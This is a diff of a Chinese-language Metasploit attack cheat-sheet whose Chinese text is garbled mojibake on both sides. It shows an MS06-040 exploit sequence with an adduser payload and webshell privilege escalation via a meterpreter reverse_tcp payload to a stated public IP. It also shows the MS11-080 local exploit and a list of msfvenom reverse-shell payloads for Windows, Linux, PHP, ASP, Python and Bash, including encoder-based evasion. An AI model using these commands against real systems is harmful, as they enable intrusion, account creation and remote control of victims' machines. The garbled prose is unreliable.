@@ -1,30 +1,30 @@
-1.°²×°ÅäÖÃ
-metasploitÒ»¿î¿ªÔ´µÄ°²È«Â©¶´¼ì²â¹¤¾ß£¬Â©¶´ÀûÓÃÆ½Ì¨
-	¹ÙÍø£ºhttps://www.metasploit.com/
-	ÏÂÔØ£ºhttps://www.rapid7.com/products/metasploit/download.jsp
-Kali°²×°vmware tools£º
+ï»¿1.å®‰è£…é…ç½®
+metasploitä¸€æ¬¾å¼€æºçš„å®‰å…¨æ¼æ´æ£€æµ‹å·¥å…·ï¼Œæ¼æ´åˆ©ç”¨å¹³å°
+	å®˜ç½‘ï¼šhttps://www.metasploit.com/
+	ä¸‹è½½ï¼šhttps://www.rapid7.com/products/metasploit/download.jsp
+Kaliå®‰è£…vmware toolsï¼š
 	http://jingyan.baidu.com/article/624e745952508c34e8ba5aca.html
 	http://jingyan.baidu.com/article/e75057f2de5792ebc81a894c.html
 
-2.³£¼ûÃüÁî
+2.å¸¸è§å‘½ä»¤
 	show exploits
 	show options
 	search XXX
 	set payload/LHOST/LPORT
 	
-	msf >show exploits				//ÏÔÊ¾MetaSploitÄ¿Ç°ËùÄÜ¹»²âÊÔµÄËùÓĞÂ©¶´¼°Ïà¹ØÃèÊö
-	msf >use windows/smb/ms06_040_netapi//Ñ¡ÔñMS06_040½øĞĞ²âÊÔ
-	msf>info						//ÏÔÊ¾µ±Ç°ËùÑ¡Â©¶´µÄÃèÊöĞÅÏ¢
-	msf>show targets				//ÏÔÊ¾µ±Ç°ËùÑ¡Â©¶´ÄÜ¹»Ó°ÏìµÄ²Ù×÷ÏµÍ³
-	msf>set target 0				//ÉèÖÃtarget Îª0£¬¼´×Ô¶¯Ê¶±ğWindows2000ºÍWindowsXPÏµÍ³
-	msf>show payloads				//ÏÔÊ¾¿ÉÊÊºÏÓÚµ±Ç°ËùÑ¡Â©¶´µÄshellcode
-	msf>set payload windows/adduser	//Ñ¡ÓÃadduserÎªshellcode
-	msf>show options				//ÏÔÊ¾µ±Ç°ËùÑ¡Â©¶´ºÍshellcodeĞèÒªÅäÖÃµÄÑ¡Ïî
-	msf>set RHOST XX.XX.XX.XX		//°´ÕÕshow optionsµÄÌáÊ¾ÉèÖÃÄ¿±êÖ÷»úµØÖ·
-	msf>set PASS  XXXXXXXXXXX		//°´ÕÕshow optionsµÄÌáÊ¾ÉèÖÃÕË»§ÃÜÂë
-	msf>set USER XXXXXX				//°´ÕÕshow optionsµÄÌáÊ¾ÉèÖÃÓÃ»§Ãû
-	msf>background					//»ñÈ¡±³¾°session
-	msf>exploit						//Ö´ĞĞ¹¥»÷
+	msf >show exploits				//æ˜¾ç¤ºMetaSploitç›®å‰æ‰€èƒ½å¤Ÿæµ‹è¯•çš„æ‰€æœ‰æ¼æ´åŠç›¸å…³æè¿°
+	msf >use windows/smb/ms06_040_netapi//é€‰æ‹©MS06_040è¿›è¡Œæµ‹è¯•
+	msf>info						//æ˜¾ç¤ºå½“å‰æ‰€é€‰æ¼æ´çš„æè¿°ä¿¡æ¯
+	msf>show targets				//æ˜¾ç¤ºå½“å‰æ‰€é€‰æ¼æ´èƒ½å¤Ÿå½±å“çš„æ“ä½œç³»ç»Ÿ
+	msf>set target 0				//è®¾ç½®target ä¸º0ï¼Œå³è‡ªåŠ¨è¯†åˆ«Windows2000å’ŒWindowsXPç³»ç»Ÿ
+	msf>show payloads				//æ˜¾ç¤ºå¯é€‚åˆäºå½“å‰æ‰€é€‰æ¼æ´çš„shellcode
+	msf>set payload windows/adduser	//é€‰ç”¨adduserä¸ºshellcode
+	msf>show options				//æ˜¾ç¤ºå½“å‰æ‰€é€‰æ¼æ´å’Œshellcodeéœ€è¦é…ç½®çš„é€‰é¡¹
+	msf>set RHOST XX.XX.XX.XX		//æŒ‰ç…§show optionsçš„æç¤ºè®¾ç½®ç›®æ ‡ä¸»æœºåœ°å€
+	msf>set PASS  XXXXXXXXXXX		//æŒ‰ç…§show optionsçš„æç¤ºè®¾ç½®è´¦æˆ·å¯†ç 
+	msf>set USER XXXXXX				//æŒ‰ç…§show optionsçš„æç¤ºè®¾ç½®ç”¨æˆ·å
+	msf>background					//è·å–èƒŒæ™¯session
+	msf>exploit						//æ‰§è¡Œæ”»å‡»
 	
 	back msf
 	ping
@@ -33,70 +33,70 @@ Kali°²×°vmware tools£º
 	getuid
 	getsystem
 
-3.ÌáÈ¨Ë¼Â·
-WebshellÌáÈ¨²½Öè
-µÚÒ»²½£ºÉú³É·´µ¯½Å±¾»òÖ´ĞĞÎÄ¼ş
+3.ææƒæ€è·¯
+Webshellææƒæ­¥éª¤
+ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆåå¼¹è„šæœ¬æˆ–æ‰§è¡Œæ–‡ä»¶
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=49.210.187.182 LPORT=4444 -f exe -o /root/door.exe
-Éú³ÉÖ´ĞĞÎÄ¼şdoor.exe °ó¶¨µØÖ·£º49.210.187.182:4444
-ÓÉÓÚÂ·ÓÉÆ÷ÉèÖÃÁË¶Ë¿Ú×ª·¢£¬½«4444¶Ë¿Ú×ª·¢ÖÁ192.168.1.111
+ç”Ÿæˆæ‰§è¡Œæ–‡ä»¶door.exe ç»‘å®šåœ°å€ï¼š49.210.187.182:4444
+ç”±äºè·¯ç”±å™¨è®¾ç½®äº†ç«¯å£è½¬å‘ï¼Œå°†4444ç«¯å£è½¬å‘è‡³192.168.1.111
 
-µÚ¶ş²½£º¼ÓÔØmsf£¬¼àÌı·´µ¯½á¹û
-	use exploit/multi/handler ÉèÖÃ½ÓÊÜ·´µ¯Ä£¿é
-	set payload windows/meterpreter/reverse_tcp ÉèÖÃ·´µ¯½á¹û´¦ÀíÔØºÉ
-	show options ²é¿´ÅäÖÃÑ¡Ïî
-	Show targets ²é¿´¹¥»÷Ä¿±ê
-	set LHOST 192.168.1.111 ÉèÖÃ±¾µØ¼àÌıµØÖ·192.168.1.111
-	exploit Ö´ĞĞ
+ç¬¬äºŒæ­¥ï¼šåŠ è½½msfï¼Œç›‘å¬åå¼¹ç»“æœ
+	use exploit/multi/handler è®¾ç½®æ¥å—åå¼¹æ¨¡å—
+	set payload windows/meterpreter/reverse_tcp è®¾ç½®åå¼¹ç»“æœå¤„ç†è½½è·
+	show options æŸ¥çœ‹é…ç½®é€‰é¡¹
+	Show targets æŸ¥çœ‹æ”»å‡»ç›®æ ‡
+	set LHOST 192.168.1.111 è®¾ç½®æœ¬åœ°ç›‘å¬åœ°å€192.168.1.111
+	exploit æ‰§è¡Œ
  
-µÚÈı²½£º½ÓÊÜ·´µ¯£¬½øĞĞÌáÈ¨²Ù×÷
-	meterpreter > getuid £¨»ñÈ¡µ±Ç°È¨ÏŞ£©
+ç¬¬ä¸‰æ­¥ï¼šæ¥å—åå¼¹ï¼Œè¿›è¡Œææƒæ“ä½œ
+	meterpreter > getuid ï¼ˆè·å–å½“å‰æƒé™ï¼‰
 		Server username: NT AUTHORITY\NETWORK SERVICE
-	meterpreter > getsystem £¨³¢ÊÔÌáÈ¨²Ù×÷£©
+	meterpreter > getsystem ï¼ˆå°è¯•ææƒæ“ä½œï¼‰
 		[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
 		[-] Named Pipe Impersonation (In Memory/Admin)
 		[-] Named Pipe Impersonation (Dropper/Admin)
 		[-] Token Duplication (In Memory/Admin)
-	meterpreter > background £¨·µ»Ø Ñ¡ÔñÌáÈ¨exp£©
+	meterpreter > background ï¼ˆè¿”å› é€‰æ‹©ææƒexpï¼‰
 		[*] Backgrounding session 1...
-	msf exploit(handler) > use exploit/windows/local/ms11_080_afdjoinleaf  (Ñ¡ÔñÌáÈ¨exp)
-	msf exploit(ms11_080_afdjoinleaf) > set session 1 £¨ÔØÈëµ±Ç°·´µ¯shell£©
+	msf exploit(handler) > use exploit/windows/local/ms11_080_afdjoinleaf  (é€‰æ‹©ææƒexp)
+	msf exploit(ms11_080_afdjoinleaf) > set session 1 ï¼ˆè½½å…¥å½“å‰åå¼¹shellï¼‰
 		session => 1
-	msf exploit(ms11_080_afdjoinleaf) > exploit £¨Ö´ĞĞ£©
+	msf exploit(ms11_080_afdjoinleaf) > exploit ï¼ˆæ‰§è¡Œï¼‰
 
-4.Éú³É·´µ¯½Å±¾
+4.ç”Ÿæˆåå¼¹è„šæœ¬
 MSF Payloads
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
 	msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
 
-MSF Éú³ÉÔÚ Linux ÏÂ·´µ¯µÄ Meterpreter Shell
+MSF ç”Ÿæˆåœ¨ Linux ä¸‹åå¼¹çš„ Meterpreter Shell
 	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
-MSF Éú³É·´µ¯ Shell (C Shellcode)
+MSF ç”Ÿæˆåå¼¹ Shell (C Shellcode)
 	msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
-MSF Éú³É·´µ¯ Python Shell
+MSF ç”Ÿæˆåå¼¹ Python Shell
 	msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
-MSF Éú³É·´µ¯ ASP Shell
+MSF ç”Ÿæˆåå¼¹ ASP Shell
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform win -o shell.asp
 	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f asp -a x86 --platform windows -o /root/shell.asp
-MSF Éú³É·´µ¯ Bash Shell
+MSF ç”Ÿæˆåå¼¹ Bash Shell
 	msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
-MSF Éú³É·´µ¯ PHP Shell
+MSF ç”Ÿæˆåå¼¹ PHP Shell
 	msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
 	add <?php at the beginning
 	perl -i~ -0777pe's/^/<?php \n/' shell.php
-MSF Éú³É·´µ¯ Win Shell
+MSF ç”Ÿæˆåå¼¹ Win Shell
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
 
-5.³£¼ûÎÊÌâ
-1)ÍøÂçÎÊÌâ£¨ÄÚÍøÎÊÌâ£©
-	²¦ºÅÉÏÍø=>´úÀíÉÏÍø
-	Â·ÓÉÆ÷ÉÏÍø=>ÉèÖÃÂ·ÓÉÆ÷¶Ë¿Ú×ª·¢
-	ÉèÖÃ¶Ë¿Ú4444µÄÁ÷Á¿×ª·¢ÖÁ192.168.1.111ÉÏ
+5.å¸¸è§é—®é¢˜
+1)ç½‘ç»œé—®é¢˜ï¼ˆå†…ç½‘é—®é¢˜ï¼‰
+	æ‹¨å·ä¸Šç½‘=>ä»£ç†ä¸Šç½‘
+	è·¯ç”±å™¨ä¸Šç½‘=>è®¾ç½®è·¯ç”±å™¨ç«¯å£è½¬å‘
+	è®¾ç½®ç«¯å£4444çš„æµé‡è½¬å‘è‡³192.168.1.111ä¸Š
  
-2)·´µ¯ÎÊÌâ
-	½Å±¾²»Ö§³Ösocket
-	·À»¤Èí¼ş
-	²ÉÓÃcdn¼ÓËÙ
+2)åå¼¹é—®é¢˜
+	è„šæœ¬ä¸æ”¯æŒsocket
+	é˜²æŠ¤è½¯ä»¶
+	é‡‡ç”¨cdnåŠ é€Ÿ
 	
-3)ÆäËû
+3)å…¶ä»–
